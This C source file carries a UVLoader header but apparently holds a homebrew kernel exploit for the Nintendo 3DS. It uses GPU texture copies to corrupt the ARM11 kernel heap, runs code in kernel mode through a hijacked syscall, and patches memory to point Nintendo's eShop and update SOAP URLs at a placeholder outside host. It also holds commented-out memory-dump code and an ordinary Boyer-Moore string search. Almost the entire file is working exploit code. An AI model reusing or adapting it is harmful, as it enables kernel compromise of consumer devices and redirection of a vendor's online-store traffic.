/*
 * uvloader.c - Userland Vita Loader entry point
 * Copyright 2012 Yifan Lu
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *    http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#define START_SECTION __attribute__ ((section (".text.start"), naked))

// make sure code is PIE
#ifndef __PIE__
#error "Must compile with -fPIE"
#endif

typedef unsigned int u32_t;
#define NULL (void*)0

#define FCRAM_BASE_START 0xE6C00000
#define FCRAM_BASE_SIZE 0x01400000
#define EC_URL_1_OFFSET 0x0//0x710E1BC
#define EC_URL_2_OFFSET 0x377//0x710E533
#define NU_URL_1_OFFSET 0x338//0x710E4F4

#define EC_URL "https://ecs.c.shop.nintendowifi.net/ecs/services/ECommerceSOAP"
#define EC_URL_REPLACE "http://mysite.com/ECommerceSOAP"
#define NU_URL_REPLACE "http://mysite.com/NetUpdateSOAP"

int (*IFile_Open)(void *this, const short *path, int flags) = 0x0022FE08;
int (*IFile_Write)(void *this, unsigned int *written, void *src, unsigned int len) = 0x00168764;
int (*memcpy)(void *dst, const void *src, unsigned int len) = 0x0023FF9C;
int (*GX_SetTextureCopy)(void *input_buffer, void *output_buffer, unsigned int size, int in_x, int in_y, int out_x, int out_y, int flags) = 0x0011DD48;
int (*GSPGPU_FlushDataCache)(void *addr, unsigned int len) = 0x00191504;
int (*svcSleepThread)(unsigned long long nanoseconds) = 0x0023FFE8;
int (*svcControlMemory)(void **outaddr, unsigned int addr0, unsigned int addr1, unsigned int size, int operation, int permissions) = 0x001431A0;

int uvl_entry();

/********************************************//**
 *  \brief Starting point from exploit
 *
 *  Call this from your exploit to run UVLoader.
 *  It will first cache all loaded modules and
 *  attempt to resolve its own NIDs which
 *  should only depend on sceLibKernel.
 *  \returns Zero on success, otherwise error
 ***********************************************/

int START_SECTION
uvl_start ()
{
    __asm__ volatile (".word 0xE1A00000");
    uvl_entry();
    __asm__ volatile ("bx lr");
}

int
do_gshax_copy (void *dst, void *src, unsigned int len)
{
    int i = 5;

    do
    {
        memcpy (0x18401000, 0x18401000, 0x10000);
        GSPGPU_FlushDataCache (src, len);
        // src always 0x18402000
        GX_SetTextureCopy(src, dst, len, 0, 0, 0, 0, 8);
        GSPGPU_FlushDataCache (0x18401000, 16);
        GX_SetTextureCopy(dst, 0x18401000, 0x40, 0, 0, 0, 0, 8);
        memcpy(0x18401000, 0x18401000, 0x10000);
    } while (i --> 0);

    return 0;
}

// heap fixing thanks to Myria
int
arm11_kernel_exploit_setup (void)
{
    void *this = 0x08F10000;
    unsigned int patch_addr;
    unsigned int *arm11_buffer = 0x18402000;
    int i;
    int (*nop_func)(void);
    int *ipc_buf;
    int model;
    patch_addr = 0xDFF83837;

    // Part 1: corrupt kernel memory
    unsigned int mem_hax_mem;
    svcControlMemory(&mem_hax_mem, 0, 0, 0x6000, 0x10003, 1 | 2);

    unsigned int tmp_addr;
    svcControlMemory(&tmp_addr, mem_hax_mem + 0x4000, 0, 0x1000, 1, 0); // free page 
    svcControlMemory(&tmp_addr, mem_hax_mem + 0x1000, 0, 0x2000, 1, 0); // free page 

    unsigned int saved_heap_3[8];
    do_gshax_copy(arm11_buffer, mem_hax_mem + 0x1000, 0x20u);
    memcpy(saved_heap_3, arm11_buffer, sizeof(saved_heap_3));

    unsigned int saved_heap_2[8];
    do_gshax_copy(arm11_buffer, mem_hax_mem + 0x4000, 0x20u);
    memcpy(saved_heap_2, arm11_buffer, sizeof(saved_heap_2));

    svcControlMemory(&tmp_addr, mem_hax_mem + 0x1000, 0, 0x2000, 0x10003, 1 | 2);
    svcControlMemory(&tmp_addr, mem_hax_mem + 0x2000, 0, 0x1000, 1, 0); // free page 

    do_gshax_copy(arm11_buffer, mem_hax_mem + 0x2000, 0x20u);

    unsigned int saved_heap[8];
    memcpy(saved_heap, arm11_buffer, sizeof(saved_heap));

    arm11_buffer[0] = 1;
    arm11_buffer[1] = patch_addr;
    arm11_buffer[2] = 0;
    arm11_buffer[3] = 0;

    // Overwrite free pointer
    do_gshax_copy(mem_hax_mem + 0x2000, arm11_buffer, 0x10u);

    // Trigger write to kernel
    svcControlMemory(&tmp_addr, mem_hax_mem + 0x1000, 0, 0x1000, 1, 0);

    memcpy(arm11_buffer, saved_heap_3, sizeof(saved_heap_3));
    do_gshax_copy(mem_hax_mem + 0x1000, arm11_buffer, 0x20u);
    memcpy(arm11_buffer, saved_heap_2, sizeof(saved_heap_2));
    do_gshax_copy(mem_hax_mem + 0x4000, arm11_buffer, 0x20u);

    // part 2: obfuscation or trick to clear code cache
    for (i = 0; i < 0x1000; i++)
    {
        arm11_buffer[i] = 0xE1A00000; // ARM NOP instruction
    }
    arm11_buffer[i-1] = 0xE12FFF1E; // ARM BX LR instruction
    nop_func = 0x009D2000 - 0x10000; // 0x10000 below current code
    do_gshax_copy(0x19592000 - 0x10000, arm11_buffer, 0x10000);
    nop_func ();

    /*
    // part 3: get console model for future use (?)
    __asm__ ("mrc p15,0,%0,c13,c0,3\t\n"
             "add %0, %0, #128\t\n" : "=r" (ipc_buf));

    ipc_buf[0] = 0x50000;
    __asm__ ("mov r4, %0\t\n"
             "mov r0, %1\t\n"
             "ldr r0, [r0]\t\n"
             "svc 0x32\t\n" :: "r" (ipc_buf), "r" (0x3DAAF0) : "r0", "r4");

    if (ipc_buf[1])
    {
        model = ipc_buf[2] & 0xFF;
    }
    else
    {
        model = -1;
    }
    *(int *)0x8F01028 = model;
    */

    return 0;
}

// after running setup, run this to execute func in ARM11 kernel mode
int __attribute__((naked))
arm11_kernel_exploit_exec (int (*func)(void))
{

    __asm__ ("svc 8\t\n" // CreateThread syscall, corrupted, args not needed
             "bx lr\t\n");
}

void
invalidate_icache (void)
{
    __asm__ ("mcr p15,0,%0,c7,c5,0\t\n"
             "mcr p15,0,%0,c7,c5,4\t\n"
             "mcr p15,0,%0,c7,c5,6\t\n"
             "mcr p15,0,%0,c7,c10,4\t\n" :: "r" (0));
}

void
invalidate_dcache (void)
{
    __asm__ ("mcr p15,0,%0,c7,c14,0\t\n"
             "mcr p15,0,%0,c7,c10,4\t\n" :: "r" (0));
}

int
memcpy_ (char *dst, const char *src, int size)
{
    while (size)
    {
        *dst++ = *src++;
        size--;
    }
    return size;
}

#define ALPHABET_LEN 255
#define NOT_FOUND patlen
#define max(a, b) ((a < b) ? b : a)

void make_delta1(int *delta1, char *pat, int patlen);
int is_prefix(char *word, int wordlen, int pos);
int suffix_length(char *word, int wordlen, int pos);
void make_delta2(int *delta2, char *pat, int patlen);
char* boyer_moore (char *string, u32_t stringlen, char *pat, u32_t patlen);
 
// delta1 table: delta1[c] contains the distance between the last
// character of pat and the rightmost occurence of c in pat.
// If c does not occur in pat, then delta1[c] = patlen.
// If c is at string[i] and c != pat[patlen-1], we can
// safely shift i over by delta1[c], which is the minimum distance
// needed to shift pat forward to get string[i] lined up 
// with some character in pat.
// this algorithm runs in alphabet_len+patlen time.
void make_delta1(int *delta1, char *pat, int patlen) {
    int i;
    for (i=0; i < ALPHABET_LEN; i++) {
        delta1[i] = NOT_FOUND;
    }
    for (i=0; i < patlen-1; i++) {
        delta1[pat[i]] = patlen-1 - i;
    }
}
 
// true if the suffix of word starting from word[pos] is a prefix 
// of word
int is_prefix(char *word, int wordlen, int pos) {
    int i;
    int suffixlen = wordlen - pos;
    // could also use the strncmp() library function here
    for (i = 0; i < suffixlen; i++) {
        if (word[i] != word[pos+i]) {
            return 0;
        }
    }
    return 1;
}
 
// length of the longest suffix of word ending on word[pos].
// suffix_length("dddbcabc", 8, 4) = 2
int suffix_length(char *word, int wordlen, int pos) {
    int i;
    // increment suffix length i to the first mismatch or beginning
    // of the word
    for (i = 0; (word[pos-i] == word[wordlen-1-i]) && (i < pos); i++);
    return i;
}
 
// delta2 table: given a mismatch at pat[pos], we want to align 
// with the next possible full match could be based on what we
// know about pat[pos+1] to pat[patlen-1].
//
// In case 1:
// pat[pos+1] to pat[patlen-1] does not occur elsewhere in pat,
// the next plausible match starts at or after the mismatch.
// If, within the substring pat[pos+1 .. patlen-1], lies a prefix
// of pat, the next plausible match is here (if there are multiple
// prefixes in the substring, pick the longest). Otherwise, the
// next plausible match starts past the character aligned with 
// pat[patlen-1].
// 
// In case 2:
// pat[pos+1] to pat[patlen-1] does occur elsewhere in pat. The
// mismatch tells us that we are not looking at the end of a match.
// We may, however, be looking at the middle of a match.
// 
// The first loop, which takes care of case 1, is analogous to
// the KMP table, adapted for a 'backwards' scan order with the
// additional restriction that the substrings it considers as 
// potential prefixes are all suffixes. In the worst case scenario
// pat consists of the same letter repeated, so every suffix is
// a prefix. This loop alone is not sufficient, however:
// Suppose that pat is "ABYXCDEYX", and text is ".....ABYXCDEYX".
// We will match X, Y, and find B != E. There is no prefix of pat
// in the suffix "YX", so the first loop tells us to skip forward
// by 9 characters.
// Although superficially similar to the KMP table, the KMP table
// relies on information about the beginning of the partial match
// that the BM algorithm does not have.
//
// The second loop addresses case 2. Since suffix_length may not be
// unique, we want to take the minimum value, which will tell us
// how far away the closest potential match is.
void make_delta2(int *delta2, char *pat, int patlen) {
    int p;
    int last_prefix_index = patlen-1;
 
    // first loop
    for (p=patlen-1; p>=0; p--) {
        if (is_prefix(pat, patlen, p+1)) {
            last_prefix_index = p+1;
        }
        delta2[p] = last_prefix_index + (patlen-1 - p);
    }
 
    // second loop
    for (p=0; p < patlen-1; p++) {
        int slen = suffix_length(pat, patlen, p);
        if (pat[p - slen] != pat[patlen-1 - slen]) {
            delta2[patlen-1 - slen] = patlen-1 - p + slen;
        }
    }
}
 
char* boyer_moore (char *string, u32_t stringlen, char *pat, u32_t patlen) {
    int i;
    int delta1[ALPHABET_LEN];
    int delta2[patlen * sizeof(int)];
    make_delta1(delta1, pat, patlen);
    make_delta2(delta2, pat, patlen);
 
    i = patlen-1;
    while (i < stringlen) {
        int j = patlen-1;
        while (j >= 0 && (string[i] == pat[j])) {
            --i;
            --j;
        }
        if (j < 0) {
            return (string + i+1);
        }
 
        i += max(delta1[string[i]], delta2[j]);
    }
    return NULL;
}

/********************************************//**
 *  \brief Search for a string in memory
 *  
 *  Uses the Boyer-Moore algorithm to search. 
 *  \returns First occurrence of @a needle in 
 *  @a haystack
 ***********************************************/
char* 
memstr (char *haystack, ///< Where to search
         int h_length,  ///< Length of @a haystack
        char *needle,   ///< String to find
         int n_length)  ///< Length of @a needle
{
    return boyer_moore (haystack, h_length, needle, n_length);
}

int __attribute__((naked))
patch_nim (void)
{
    __asm__ ("add sp, sp, #8\t\n"
             "stmfd sp!,{r0-r12,lr}\t\n");

    // fix up memory
    *(int*)(0xDFF83837+8) = 0x8DD00CE5;
    invalidate_icache ();
    //memcpy (0xE4410000, 0xFFFF0000, 0x1000);
    invalidate_dcache ();

    //((int(*)(int))0xFFF13DFC)(0xf);

    //*(char*)(0x1FF80014) |= 0x3;

    *(char**)0x18410000 = memstr(FCRAM_BASE_START, FCRAM_BASE_SIZE, EC_URL, sizeof(EC_URL));
    if (*(char**)0x18410000)
    {
        memcpy_(*(char**)0x18410000+EC_URL_1_OFFSET, EC_URL_REPLACE, sizeof(EC_URL_REPLACE));
        memcpy_(*(char**)0x18410000+EC_URL_2_OFFSET, EC_URL_REPLACE, sizeof(EC_URL_REPLACE));
        memcpy_(*(char**)0x18410000+NU_URL_1_OFFSET, NU_URL_REPLACE, sizeof(NU_URL_REPLACE));
    }

    /*
    memcpy_(FCRAM_START+EC_URL_1_OFFSET, EC_URL_REPLACE, sizeof(EC_URL_REPLACE));
    memcpy_(FCRAM_START+EC_URL_2_OFFSET, EC_URL_REPLACE, sizeof(EC_URL_REPLACE));
    memcpy_(FCRAM_START+NU_URL_1_OFFSET, NU_URL_REPLACE, sizeof(NU_URL_REPLACE));
    */
    //memcpy(0x18410000, FCRAM_START+EC_URL_1_OFFSET, 0x100);
    //memcpy(0x18410100, FCRAM_START+EC_URL_2_OFFSET, 0x100);
    //memcpy(0x18410200, FCRAM_START+NU_URL_1_OFFSET, 0x100);

    __asm__ volatile ("ldmfd sp!,{r0-r12,lr}\t\n"
                      "movs r0, #0      \t\n"
                      "ldr pc, [sp], #4 \t\n");
}

/********************************************//**
 *  \brief Entry point of UVLoader
 *
 *  \returns Zero on success, otherwise error
 ***********************************************/
int
uvl_entry ()
{
    unsigned int addr;
    void *this = 0x08F10000;
    int *written = 0x08F01000;
    int *buf = 0x18410000;
    int i;

    // wipe memory for debugging purposes
    for (i = 0; i < 0x1000/4; i++)
    {
        buf[i] = 0xdeadbeef;
    }

    //arm11_kernel_exploit_setup ();
    //arm11_kernel_exploit_exec (arm11_kernel_dump);

    //IFile_Open(this, L"dmc:/before-setup.bin", 6);
    arm11_kernel_exploit_setup ();
    //IFile_Open(this, L"dmc:/before-exec.bin", 6);
    arm11_kernel_exploit_exec (patch_nim);

    //svcSleepThread (0x2540be400ll);
    __asm__ ("svc #9");

    //*(int*)0 = 0;
    
    /*
    // FCRAM dump
    for (addr = 0x14000000; addr < 0x1A800000; addr += 0x10000)
    {
        GSPGPU_FlushDataCache (addr, 0x10000);
        GX_SetTextureCopy (addr, buf, 0x10000, 0, 0, 0, 0, 8);
        GSPGPU_FlushDataCache (buf, 0x10000);
        svcSleepThread (0x400000LL);
        IFile_Write(this, written, buf, 0x10000);
    }
    */

    //while (1);

    return 0;
}

/********************************************//**
 *  \brief Exiting point for loaded application
 *
 *  This hooks on to exit() call and cleans up
 *  after the application is unloaded.
 *  \returns Zero on success, otherwise error
 ***********************************************/
int
uvl_exit (int status)
{
    return 0;
}
